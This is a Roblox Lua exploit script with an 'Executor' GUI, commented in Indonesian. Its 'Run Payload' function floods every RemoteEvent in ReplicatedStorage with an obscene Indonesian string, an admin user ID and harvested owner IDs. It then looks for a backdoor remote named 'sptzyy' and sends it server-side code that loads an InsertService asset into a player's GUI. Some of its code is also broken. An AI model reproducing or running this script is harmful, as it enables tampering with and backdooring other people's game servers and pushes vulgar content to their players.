-- === Konfigurasi & Service ===
local GUI_NAME = "ExecutorGUI"
local ICON_ID = "rbxassetid://7335147596" 
local FLOATING_ICON_EMOJI = "🛡️"
local ICON_SIZE = UDim2.new(0, 50, 0, 50) 
local DRAG_THRESHOLD = 5 
local LOOP_INTERVAL = 0.5 -- Tidak digunakan, bisa dihapus atau diabaikan
local SCAN_INTERVAL = 0.005 -- Tidak digunakan, bisa dihapus atau diabaikan
local CONSOLE_PADDING = UDim.new(0, 5) -- Tidak digunakan, bisa dihapus atau diabaikan
local BUTTON_HEIGHT = 30 
local BUTTON_SPACING = 5  

-- Warna Modern/Minimalis
local COLOR_BG = Color3.fromRGB(35, 35, 35)      
local COLOR_ACCENT = Color3.fromRGB(0, 150, 255)  
local COLOR_ON = Color3.fromRGB(0, 200, 83)      
local COLOR_OFF = Color3.fromRGB(50, 50, 50)     
local COLOR_SCAN = Color3.fromRGB(255, 165, 0)   
local COLOR_WARN = Color3.fromRGB(255, 50, 50)   

-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService") -- Ditambahkan untuk RenderStepped
local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Ditambahkan

local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait() -- Menunggu LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui") -- Memastikan LocalPlayer tersedia
local task = task

-- Variabel
local IS_GUI_VISIBLE = false
local isMainFrameDraggingFunction = function() return false end -- Deklarasi awal

-- === 1. Fungsi Notifikasi ===
local function notify(title, text, duration, iconOverride)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3,
        Icon = iconOverride or ICON_ID,
    })
end

-- === 7. Fungsi Drag GUI (Diperbarui untuk mengembalikan status dragging) ===
local function makeDraggable(frame)
    local dragging = false
    local dragStartPos = nil
    local startFramePos = nil
    local isDragging = false 

    local dragArea = frame:FindFirstChild("DragHandle") or frame
    dragArea.Active = true

    dragArea.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            isDragging = false 
            dragStartPos = input.Position
            startFramePos = frame.Position
        end
    end)

    dragArea.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
            local delta = input.Position - dragStartPos
            -- Cek threshold hanya sekali
            if not isDragging and (delta.X * delta.X + delta.Y * delta.Y) > (DRAG_THRESHOLD * DRAG_THRESHOLD) then
                isDragging = true
            end
            
            if isDragging then
                frame.Position = UDim2.new(startFramePos.X.Scale, startFramePos.X.Offset + delta.X, startFramePos.Y.Scale, startFramePos.Y.Offset + delta.Y)
            end
        end
    end)
    
    dragArea.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    -- Mengembalikan fungsi yang melaporkan apakah frame sedang di-drag
    return function()
        return isDragging
    end
end

-- === 2. Pembuatan GUI utama dan sub-Frame ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = GUI_NAME
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.Parent = PlayerGui 

local total_buttons = 2 -- Mengubah jumlah tombol yang akan dihitung di Frame: PayloadButton + IconToggleButton
local main_frame_height = 30 + (total_buttons * BUTTON_HEIGHT) + ((total_buttons + 1) * BUTTON_SPACING) -- Perhitungan ketinggian Frame (Title 30 + (2 tombol) + (3 spasi) )

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 250, 0, main_frame_height) 
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -(main_frame_height / 2)) 
MainFrame.BackgroundColor3 = COLOR_BG
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false 
MainFrame.Parent = ScreenGui

local CornerMain = Instance.new("UICorner")
CornerMain.CornerRadius = UDim.new(0, 8) 
CornerMain.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "DragHandle" 
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.BackgroundColor3 = COLOR_ACCENT
TitleLabel.Text = "🛠️ PANEL (2 FITUR)"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.SourceSansSemibold
TitleLabel.TextSize = 18
TitleLabel.Active = true 
TitleLabel.Parent = MainFrame

-- *** Menghapus 'IconButton' yang redundan atau tidak digunakan sebagai tombol utama ***

local function getButtonY(index)
    -- Menghitung posisi Y relatif terhadap TitleLabel (tinggi 30)
    return 30 + (BUTTON_SPACING * index) + (BUTTON_HEIGHT * (index - 1))
end

-- Tombol 1: Run Payload (Posisi ke-1)
local function runPayload()
    if isMainFrameDraggingFunction() then return end -- Menggunakan fungsi drag state
    notify("🚀 Payload", "Menjalankan payload...", 3)
    
    local modelName = "sptzyy"
    local zyy = nil
    
    -- Hapus objek dengan nama modelName dari workspace
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj.Name == modelName then
            obj:Destroy()
        end
    end

    -- Deteksi saat objek modelName ditambahkan
    Workspace.ChildAdded:Connect(function(child)
        if child.Name == modelName and zyy == nil and child:IsA("RemoteEvent") then -- Memastikan RemoteEvent
            zyy = child 
            print("Found zyy!")
        end
    end)

    local payload = "KONTOL MESUM😂"

    -- Kirim payload ke RemoteEvent (MENGGUNAKAN ReplicatedStorage yang sudah di-service)
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(payload)
            end)
            RunService.RenderStepped:Wait()
        end
    end
    
    task.wait(0.5)

    -- Kirim payload admin ID
    local adminPayloads = {9880962516}
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            for _, payloadID in ipairs(adminPayloads) do
                pcall(function()
                    remote:FireServer(payloadID)
                end)
            end
            RunService.RenderStepped:Wait()
        end
    end

    -- Kumpulkan OwnerID
    local ownerIDList = {}
    for _, obj in ipairs(Workspace:GetChildren()) do
        local ownerIDValue = obj:FindFirstChild("OwnerID")
        if ownerIDValue and ownerIDValue:IsA("IntValue") or ownerIDValue:IsA("NumberValue") then
            local ownerID = ownerIDValue.Value
            if not table.find(ownerIDList, ownerID) then
                table.insert(ownerIDList, ownerID)
            end
        end
    end

    -- Kirim ke semua OwnerID
    for _, ownerID in ipairs(ownerIDList) do
        for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
            if remote:IsA("RemoteEvent") then
                pcall(function()
                    remote:FireServer(ownerID)
                end)
                RunService.RenderStepped:Wait()
            end
        end
    end
    
    -- Kirim payload ke zyy jika ketemu
    if zyy and zyy:IsA("RemoteEvent") then
        local playerName = LocalPlayer.Name
        -- Payload inject GUI (Contoh: menggunakan InsertService untuk memuat aset)
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        pcall(function()
            zyy:FireServer(insertPayload) -- Diasumsikan 'zyy' adalah RemoteEvent
        end)
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "sptzyy",
            Text = "RemoteEvent sptzyy tidak ditemukan. :(",
            Icon = "",
            Duration = 5,
        })
    end
end

local PayloadButton = Instance.new("TextButton")
PayloadButton.Name = "PayloadButton"
PayloadButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
PayloadButton.Position = UDim2.new(0.05, 0, 0, getButtonY(1))
PayloadButton.BackgroundColor3 = COLOR_ACCENT -- Mengganti ke COLOR_ACCENT agar menonjol
PayloadButton.Text = "🚀 Run Payload"
PayloadButton.Parent = MainFrame
PayloadButton.MouseButton1Click = runPayload

-- Tombol 2: Icon toggle (Posisi ke-2)
local function toggleIcon()
    if isMainFrameDraggingFunction() then return end -- Menggunakan fungsi drag state
    notify("🎭 Icon Toggle", "Fitur icon toggle belum diimplementasikan.", 2)
    -- Implementasi: Misalnya, mengubah transparansi/visibilitas FloatingIcon
    -- FloatingIcon.Visible = not FloatingIcon.Visible
end

local IconToggleButton = Instance.new("TextButton")
IconToggleButton.Name = "IconToggleButton"
IconToggleButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
IconToggleButton.Position = UDim2.new(0.05, 0, 0, getButtonY(2))
IconToggleButton.BackgroundColor3 = COLOR_OFF
IconToggleButton.Text = "🎭 ICON TOGGLE"
IconToggleButton.Parent = MainFrame
IconToggleButton.MouseButton1Click = toggleIcon

-- Style semua tombol
for _, btn in ipairs(MainFrame:GetChildren()) do
    if btn:IsA("TextButton") then
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.SourceSansBold
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 6)
        Corner.Parent = btn
    end
end

-- === 8. Support drag GUI (diperbarui)
isMainFrameDraggingFunction = makeDraggable(MainFrame) -- Menghubungkan drag function ke MainFrame

-- === 3. Icon floating dan toggle
local FloatingIcon = Instance.new("TextButton") 
FloatingIcon.Name = "FloatingIcon" -- Nama diubah
FloatingIcon.Size = ICON_SIZE
FloatingIcon.Position = UDim2.new(0.02, 0, 0.85, 0) 
FloatingIcon.BackgroundTransparency = 0 
FloatingIcon.BackgroundColor3 = COLOR_ACCENT 
FloatingIcon.Text = FLOATING_ICON_EMOJI 
FloatingIcon.Font = Enum.Font.SourceSans
FloatingIcon.TextSize = ICON_SIZE.Offset.X * 0.7 -- Ukuran emoji proporsional
FloatingIcon.Parent = ScreenGui 

local CornerIcon = Instance.new("UICorner")
CornerIcon.CornerRadius = UDim.new(0.5, 0) 
CornerIcon.Parent = FloatingIcon

local isIconDragging = makeDraggable(FloatingIcon) -- Menggunakan fungsi drag state dari FloatingIcon

FloatingIcon.MouseButton1Click:Connect(function()
    if not isIconDragging() then
        IS_GUI_VISIBLE = not IS_GUI_VISIBLE
        MainFrame.Visible = IS_GUI_VISIBLE 
        
        notify("⚙️ GUI Status", "Panel Eksekutor: " .. (IS_GUI_VISIBLE and "Terlihat" or "Tersembunyi"), 2)
    end
end)

-- === 4. Finalisasi & Notifikasi
notify("✅ Executor Loaded", "Floating Icon " .. FLOATING_ICON_EMOJI .. " aktif. Klik untuk buka panel.", 4)

